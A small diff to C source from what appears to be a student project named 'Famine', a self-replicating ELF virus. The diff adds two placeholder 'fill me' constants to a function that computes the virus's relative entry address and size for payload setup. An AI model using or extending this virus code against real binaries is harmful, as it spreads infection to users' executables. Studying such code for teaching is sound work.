@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/05/11 00:10:33 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/06/10 19:23:44 by agrumbac         ###   ########.fr       */
+/*   Updated: 2019/06/12 13:49:53 by spolowy          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -83,6 +83,9 @@ static void	init_constants(struct client_info *constants, \
 	constants->relative_virus_address   = (uint64_t)virus - (uint64_t)famine_entry;
 	constants->relative_entry_address   = rel_text - clone_entry->offset_in_section;
 	constants->virus_size               = (uint64_t)_start - (uint64_t)virus;
+
+	constants->fill_me[0]               = 0x00656d206c6c6966; // TMP
+	constants->fill_me[1]               = 0x00656d206c6c6966; // TMP
 }
 
 bool		setup_payload(const struct entry *clone_entry, const struct safe_pointer info)
